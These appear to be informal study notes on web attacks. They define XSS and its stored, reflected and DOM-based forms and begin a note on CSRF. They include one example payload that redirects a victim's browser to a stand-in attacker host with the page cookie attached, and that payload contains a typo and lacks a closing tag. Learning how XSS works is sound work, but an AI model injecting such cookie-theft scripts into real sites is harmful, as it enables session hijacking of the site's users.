-XSS
xss is a code injection attack which allows an attacker to execute malicious 
javascript in another user's browser.
directly user inputs means potential xss
some malicious attacks:
	cookie theft - access to victm's cookies (document.cookie)
	keylogging - keyboard event listener (addEventListener)
	Phishing - DOM manipulation
example attack:
<script>window.location='http://atacker/?cookie='+dockument.cookie
this script navigates the user to a different URL , triggers an HTTP request to 
the attacker's server. The url includes the victim's cookie as a parameter,
an attacker cn extract it.
persistent xss - originates from the website's database
reflected xss - originates from the victim's request
DOM-based xss - originates from the client side code
-CSRF
similar to xss, csrf allows an attacker to take arbitrary actions as the victim
against a website
